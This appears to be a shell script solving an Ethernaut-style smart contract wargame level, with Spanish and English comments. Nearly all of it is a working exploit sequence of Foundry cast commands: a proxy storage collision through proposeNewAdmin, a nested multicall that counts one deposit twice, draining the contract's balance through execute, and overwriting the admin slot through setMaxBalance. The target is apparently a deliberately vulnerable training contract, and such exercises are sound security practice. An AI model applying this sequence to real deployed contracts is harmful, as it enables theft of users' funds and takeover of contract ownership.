source ~/ethernauts/.env
echo "RPC_URL: $RPC_URL"

# cast send \
#     --rpc-url $RPC_URL \
#     0x5306253Df4Ea8E817C59ccc08cb15B035FF2e614 \
#     --private-key $PRIVATE_KEY \
#     "proposeNewAdmin(address)()" $PRIMARY_ADDRESS

# cast send \
#     --private-key $PRIVATE_KEY \
#     --rpc-url $RPC_URL \
#     0x5306253Df4Ea8E817C59ccc08cb15B035FF2e614 \
#     "addToWhitelist(address)()" $PRIMARY_ADDRESS

# cast send \
#     --private-key $PRIVATE_KEY \
#     --rpc-url $RPC_URL \
#     0x5306253Df4Ea8E817C59ccc08cb15B035FF2e614 \
#     "deposit()()" --value 1000000000000000


# quiro multicall a función setMaxBalance con mi address como parametro:
# cast sig "setMaxBalance(uint256)" > 0x9d51d9b7
# calldata > 0x000000000000000000000000b321099cf86d9bb913b891441b014c03a6ccfc54
# concat > 0x9d51d9b7000000000000000000000000b321099cf86d9bb913b891441b014c03a6ccfc54

# mentira, quiero:
# multicall(deposit, multicall(deposit))
# cast sig "deposit()" > 0xd0e30db0
# calldata > 0x
# cast sig "multicall(bytes[])" > 0xac9650d8
# cast abi-encode "multicall(bytes[])" "[0xd0e30db0]" > 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000
# concat: 0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000

# cast send \
#     --rpc-url $RPC_URL \
#     --private-key $PRIVATE_KEY \
#     0x5306253Df4Ea8E817C59ccc08cb15B035FF2e614 \
#     "multicall(bytes[])" [0xd0e30db0,0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000] \
#     --value 1000000000000000

# cast call \
#     --rpc-url $RPC_URL \
#     0x5306253Df4Ea8E817C59ccc08cb15B035FF2e614 \
#     "balances(address)(uint256)" $PRIMARY_ADDRESS

# cast balance \
#     --rpc-url $RPC_URL \
#     0x5306253Df4Ea8E817C59ccc08cb15B035FF2e614

# now i have access to the total amount of money! drain it.
# cast send \
#     --rpc-url $RPC_URL \
#     --private-key $PRIVATE_KEY \
#     0x5306253Df4Ea8E817C59ccc08cb15B035FF2e614 \
#     "execute(address, uint256, bytes)" $PRIMARY_ADDRESS 3000000000000000 0x00

# contract drained, now lets overstem max_balance with my address to make me owner.
# cast send \
#     --rpc-url $RPC_URL \
#     --private-key $PRIVATE_KEY \
#     0x5306253Df4Ea8E817C59ccc08cb15B035FF2e614 \
#     "setMaxBalance(uint256)" $PRIMARY_ADDRESS

cast call \
    --rpc-url $RPC_URL \
    0x5306253Df4Ea8E817C59ccc08cb15B035FF2e614 \
    "admin()(address)"

